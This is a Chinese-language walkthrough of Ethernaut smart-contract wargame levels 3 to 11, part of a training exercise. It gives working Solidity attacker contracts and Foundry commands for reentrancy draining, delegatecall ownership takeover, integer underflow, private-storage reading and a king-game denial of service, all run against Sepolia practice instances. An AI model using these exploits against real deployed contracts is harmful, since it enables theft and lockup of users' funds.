# ethernaut

## level 3

[The Ethernaut level 3](https://ethernaut.openzeppelin.com/level/0xA62fE5344FE62AdC1F356447B669E9E6D10abaaF)

这一关的要求是在一次投币游戏中通过猜测投币的结果连续正确10次。

为了在连续猜对10次，必须预测 `blockValue`，并在调用 `flip` 函数时提供正确的 `_guess` 参数。

基于以上的分析，可以设计如下步骤来连续正确猜测10次：

1. 部署一个新的合约(`Attacker`)，该合约能够计算并预测 `CoinFlip` 合约的投币结果。
2. 使用该合约调用 `CoinFlip` 合约的 `flip` 函数，这样每次都能提供正确的 `_guess` 参数。
3. 重复调用多次

示例合约在[这里](ethernaut/script/Level03.s.sol)

链上记录：
- level(`CoinFlip`) 新实例：https://sepolia.etherscan.io/address/0x7ECf6bB565c69ccfac8F5d4b3D785AB78a00F677
- attacker 合约：https://sepolia.etherscan.io/address/0xdce3c80980837bfb66524bc0ccf3d2f5db5ae8ff



## level 4

[The Ethernaut level 4](https://ethernaut.openzeppelin.com/level/0x2C2307bb8824a0AbBf2CC7D76d8e63374D2f8446)

这一关的要求是获得合约的owner权限。

要获得owner权限，需要调用 `changeOwner` 方法，但条件是 `tx.origin != msg.sender`。

这个条件可以通过使用一个中间合约来绕过，通过中间合约去调用目标合约来实现。此时
- `tx.origin` = 发送交易者
- `msg.sender` = 中间合约地址

示例合约在[这里](Writeup/phipupt/ethernaut/script/Level04.s.sol)

链上记录：
- level(`Telephone`) 新实例：0x231014b0FEf1C0AF96189700a43221fACF1DfF7E
- attacker 合约：https://sepolia.etherscan.io/address/0xa380337b31833736daa3a044a41e5fb821d15128
- 可以使用 `cast call` 命令来调用目标合约的 `owner` 函数来获取 `owner` 地址。：
`cast call 0x231014b0FEf1C0AF96189700a43221fACF1DfF7E "owner()(address)" --rpc-url sepolia`


## level 5

[The Ethernaut level 5](https://ethernaut.openzeppelin.com/level/0x478f3476358Eb166Cb7adE4666d04fbdDB56C407)

这一关要求获得更多的token。

合约看起来没什么问题，但是 solidity 版本用的是是 0.6，没有处理整型的下溢/溢出。

因此，只需要发送大于 20 的值，比如 21，就可以获得 21 个token

直接使用 Foundry 的命令: 

查询余额：

```
cast call <level address> \
"balanceOf(address)(uint256)" <receiver> \
--rpc-url sepolia
```

转账（获取更多token）
```
cast send <level address> \
"transfer(address,uint256)(bool)" <receiver> 21 \
--rpc-url sepolia \
--private-key <deployer private key> 
```

链上记录：
- level(`Token`) 新实例：[0xC8622C44a00a6d01a0c63390eD54E111ef56282f](https://sepolia.etherscan.io/address/0xC8622C44a00a6d01a0c63390eD54E111ef56282f)
- receiver: 0x5859FdBE15be13b4413F0E5F96Ce27364F6E21C8


## level 6

[The Ethernaut level 6](https://ethernaut.openzeppelin.com/level/0x73379d8B82Fda494ee59555f333DF7D44483fD58)

这一关要求获得 `Delegation` 合约的 `owner` 权限

要获取 `Delegation` 合约中的 `owner` 权限，关键在于利用 `Delegation` 合约的 `fallback` 函数和 `delegatecall` 的特性。`delegatecall` 会在调用合约的上下文中执行被调用的代码，这意味着它会使用调用合约的存储。

步骤如下：
1. 计算 `Delegate` 合约中 `pwn()` 函数的函数选择器

    `pwn() `函数的选择器是其函数签名的 `keccak256` 哈希的前 4 个字节。

2. 向 `Delegation` 合约发送一个调用，其中：

    `msg.data` 应该是 `pwn()` 函数的选择器。

    可以使用任何数量的 ETH。

3. 这将触发 `Delegation` 合约的 `fallback` 函数，进而使用 `delegatecall` 调用 `Delegate` 合约的 `pwn()` 函数。
4. 由于使用了 `delegatecall`，`pwn()` 函数将在 `Delegation` 合约的上下文中执行，从而将调用者的地址设置为 `Delegation` 合约的 `owner。`

使用 Foundry cast 命令可以更简单：

调用 `Delegation` 合约 `pwn()` 函数
```
cast send <level address> \
"pwn()()" \
--rpc-url sepolia \
--private-key <your private key> 
```

查询当前 `owner`
```
cast call <level address> \
"owner()(address)" \
--rpc-url sepolia
```

链上记录：
- level(`Delegation`) 新实例：[0xA54C5bFcdd15Cb9D38485741C5b304a20E269eB5](https://sepolia.etherscan.io/address/0xA54C5bFcdd15Cb9D38485741C5b304a20E269eB5)
- 获取权限的交易的哈希: [0xa74c34ac10570535f2faa6b86677a3a2c5799783fac5bfe874c3cbbf9d27c3b2](https://sepolia.etherscan.io/tx/0xa74c34ac10570535f2faa6b86677a3a2c5799783fac5bfe874c3cbbf9d27c3b2)


## lelve 7

[The Ethernaut level 7](https://ethernaut.openzeppelin.com/level/0xb6c2Ec883DaAac76D8922519E63f875c2ec65575)

这一关的要求是增加 `Forece` 合约的 ether 余额

`Force` 合约没有任何函数，要想向该合约发送 ether，普通转账是不行的。需要使用一些特殊的方法。以下是几种可能的方式：
1. 自毁方法（`selfdestruct`）：这是最常见的强制发送以太币到一个没有接收函数的合约的方法。
2. 预部署合约：使用 `CREATE2` 操作码预先计算出合约的地址，并在合约部署之前向该地址发送 ether。

由于合约不是自己部署，因此采用第一种方式。

示例代码：
```
contract Attacker {
    constructor() {}

    function attack(address receiver) public payable {
        selfdestruct(payable(receiver));
    }

    receive() external payable {}
}
```
完整代码见：[Attacker](ethernaut/script/level07/Attacker.s.sol)

使用Foundry：

调用脚本部署 `Attacker` 合约并且发动 `attack`：
```
forge script script/level07/Attacker.s.sol:CallContractScript --rpc-url sepolia --broadcast

```

查询 ether 余额
```
cast balance 0xd2E4Ba00684F3d61D585ca344ec566e03FA06F47 --rpc-url sepolia
```

链上记录：
- [level(`Force`) 实例](https://sepolia.etherscan.io/address/0xd2E4Ba00684F3d61D585ca344ec566e03FA06F47)
- [自毁并发送 ether 交易](https://sepolia.etherscan.io/tx/0xbc33047553c932bba41adb3e45c83940e7a5c5df4343a08121851c3bee357a7c)


## lelve 8

[The Ethernaut level 8](https://ethernaut.openzeppelin.com/level/0xB7257D8Ba61BD1b3Fb7249DCd9330a023a5F3670)

这一关的要求是反转 `Vault` 的 `locked` 状态

`Vault` 合约提供了 `unlock` 函数，只需要提供对应的密码。虽然在合约中密码字段设置为 `private`，无法通过公开的方法访问。但是区块链上的状态变量是公开的，可以通过读取合约的存储插槽读区的值。  
`Vault` 合约中 `password` 状态变量占用插槽1，可以通过 foundry 读取该插槽的值。

示例代码：
```
Vault level = Vault(0x2a27021Aa2ccE6467cDc894E6394152fA8867fB4);

bytes32 password = vm.load(address(level), bytes32(uint256(1)));

level.unlock(password);
```
完整代码见：[这里](ethernaut/script/level08.s.sol)

Foundry 脚本：

调用脚本去读区对应插槽的值：
```
forge script script/level08.s.sol:CallContractScript --rpc-url sepolia --broadcast
```

查询 locked 状态
```
cast call 0x2a27021Aa2ccE6467cDc894E6394152fA8867fB4 \
"locked()(bool)" \
--rpc-url sepolia
```

链上记录：
- [level(`Vault`) 实例](https://sepolia.etherscan.io/address/0x2a27021Aa2ccE6467cDc894E6394152fA8867fB4)
- [调用 `unlock` 函数](https://sepolia.etherscan.io/tx/0xf9600a8004358b0e446be4fb24152ecd4681b3a09ebb010136662ccd6a6185a1)


## lelve 9

[The Ethernaut level 9]([https://ether](https://ethernaut.openzeppelin.com/level/9))

这一关的要求是结束这个庞氏游戏。

仔细阅读这个合约，发现，只要发送 ether 数量比当前 `prize` 值大，就可以成为新的 `king`。同时， `owner` 有权限直接让游戏从零开始。

注意到 `receive` 函数中使用了 `transfer`，而且没有判断改方法执行是否成功。因此，可以从这里下手。只要 `tansfer` 失败了，函数回退，任何人都无法再继续这个游戏。

令 `reansfer` 失败最简单的方式就是写一个不接收 ether 的函数（没有 `fallback` 或 `receive` ），让这和合约成为新的 `king` 就行了。

步骤如下：
1. 部署一个不接收 ether 的合约
2. 令这个合约成为新的 `king`

实例代码如下：

```
contract Attacker {
    address targetAddr;
    bool locked;
    constructor(address targetAddr_) {
        targetAddr = targetAddr_;
    }

    function attack(uint value) public payable {
        (bool success, ) = targetAddr.call{value: value}("");

        require(success, "claim kingship failed");
    }

    receive() external payable {
        require(!locked, "Never send a wei");
        locked = true;
    }
}
```

还需要一个脚本去部署 `Attacker` 合约并发送大于当前 `prize` 的 ether 数量成为 `king`

```
address levelAddr = 0xDB22a38C8d51dc8CF7bfBbffAb8f618cFE148a04;

Attacker attacker = new Attacker(levelAddr);

King target = King(payable(levelAddr));

// 计算需要给攻击合约至少发送多少 ether
uint minValue = target.prize() + 1;
(bool success, ) = address(attacker).call{value: minValue}("");
require(success, "Failed to send Ether to the attacker contract");

// 攻击合约发动攻击
attacker.attack(minValue);
```

完整代码见：[这里](ethernaut/script/level09.s.sol)

Foundry 脚本：

调用脚本部署并发动攻击：
```
forge script script/level09.s.sol:CallContractScript --rpc-url sepolia --broadcast
```

查询当前 king
```
cast call <level address> \
"_king()(address)" \
--rpc-url sepolia
```

查询当前 prize
```
cast call <level address> \
"prize()(uint256)" \
--rpc-url sepolia
```

尝试获取king
```
cast send <level address> \
--value <value greate than prize> \
--rpc-url sepolia \
--private-key <your private key>
```

链上记录：
- [level(`King`) 实例](https://sepolia.etherscan.io/address/0xDB22a38C8d51dc8CF7bfBbffAb8f618cFE148a04)
- [attack](https://sepolia.etherscan.io/tx/0xbead529e69d0027837c5329fc591b96b5b08cb317d64995e25cc7a82822642ae)


## lelve 10

[The Ethernaut level 10](https://ethernaut.openzeppelin.com/level/0x2a24869323C0B13Dff24E196Ba072dC790D52479)

这一关的要求是获取合约里所有的资金。

仔细阅读这个合约，发现，这是个典型的重入攻击案例。

问题出在 withdraw 方法，在更新余额之前调用了 `msg.sender.call{value: _amount}("")`。这意味着在调用者收到以太币后，调用者仍然有能力再次调用 withdraw 函数（即发生重入），在余额尚未更新之前再进行一次提取。通过这种方式，攻击者可以反复进行 withdraw 操作，把整个合约的余额全部提走。

采用 Checks-Effects-Interactions 模式可以修复这个重入的问题。

攻击合约步骤如下：
1. 捐赠一定数量 ether 给目标合约
2. 编写 receive 函数，接收到 ether 时向目标合约发起 withdraw
3. 准备就绪后，发起 withdraw

示例代码如下：

```
contract Attacker {
    Reentrance target;

    constructor(address targetAddr) public {
        target = Reentrance(payable(targetAddr));
    }

    function attack(uint amount) public {
        target.donate{value: amount}(address(this));
        target.withdraw(amount);
    }

    receive() external payable {
        if (address(target).balance >= msg.value) {
            target.withdraw(msg.value);
        }
    }
}
```

还需要一个脚本去部署 `Attacker` 合约并发起攻击

```
address levelAddr = 0x5506958fC2AB6709357d9cB7F813cfb3a387b5B7;

Attacker attacker = new Attacker(levelAddr);

uint amount = 0.001 ether; // level 合约当前balance
(bool success, ) = address(attacker).call{value: amount}(""); // 先发送 ether 给 attacker
require(success, "fund attacker failed");

attacker.attack(amount);
```

完整代码见：[这里](ethernaut/script/level10.s.sol)

Foundry 脚本：

调用脚本部署并发动攻击：
```
forge script script/level10.s.sol:CallContractScript --rpc-url sepolia --broadcast
```

查询当前地址余额
```
cast balance <address> --rpc-url sepolia
```


链上记录：
- [level(`King`) 实例](https://sepolia.etherscan.io/address/0x5506958fC2AB6709357d9cB7F813cfb3a387b5B7)
- [Attacker](https://sepolia.etherscan.io/tx/0x34cA64426b2F010bae810b3dFCb41Dd989598957)
- [attack](https://sepolia.etherscan.io/tx/0xf7a7509d4579e909890cce22d131ae8e7f204f2e2fe8f89a4a3a39af092707a4)


## lelve 11

[The Ethernaut level 11](https://ethernaut.openzeppelin.com/level/0x6DcE47e94Fa22F8E2d8A7FDf538602B1F86aBFd2)

这一关的要求是让电梯合约达到顶楼。

仔细阅读这个合约，发现 Building 合约并没有任何实现细节。而且 Elevator 合约里实例化 Building 时使用了 msg.send 作为地址。

因此，我们可以编写一个实现了 Building 接口的合约实现关键的 `isLastFloor` 方法。再通过这个合约去调用 `Elevator` 合约的 `goTo` 方法。这样就可以通过控制 `Building` 合约的返回值，进而达到目的。

攻击合约步骤如下：
1. 编写一个实现了 Building 接口的合约
2. 实现 `isLastFloor` 方法，第一次调用时返回 `false，之后调用返回` `true`
3. 编写 `attack` 函数调用 Elevator 的 `goTo(floor)` 方法;
4. 调用 `attack` 函数发起攻击

示例代码如下：

```
contract Attacker is Building {
    Elevator elevator;
    bool hasCalled;

    constructor(address elevator_) {
        elevator = Elevator(elevator_);
    }

    function isLastFloor(uint256 _floor) public returns (bool) {
        if (hasCalled) return true;

        hasCalled = true;
        return false;
    }

    function attack(uint floor) public {
        elevator.goTo(floor);
    }
}
```

还需要一个脚本去部署 `Attacker` 合约并发起攻击

```
address levelAddr = 0x5B0424701F6f9a8e27CF76DAfC918A5E558f0Dc5;

Attacker attacker = new Attacker(levelAddr);

attacker.attack(100);
```

完整代码见：[这里](ethernaut/script/level11.s.sol)

Foundry 脚本：

调用脚本部署并发动攻击：
```
forge script script/level11.s.sol:CallContractScript --rpc-url sepolia --broadcast
```

查询是否到达顶层
```
cast call 0x5B0424701F6f9a8e27CF76DAfC918A5E558f0Dc5 \
"top()(bool)" \
--rpc-url sepolia
```


链上记录：
- [level(`Elevator`)](https://sepolia.etherscan.io/address/0x5B0424701F6f9a8e27CF76DAfC918A5E558f0Dc5)
- [Attacker](https://sepolia.etherscan.io/tx/0xe7A0a41d009bB4D3cCEa09A39423e9499A6dEC48)
- [attack 交易](https://sepolia.etherscan.io/tx/0x4fd6a5b48ad937e8e9d210f9cef031d39ba50ea6df51685edbe15e37512b0971)
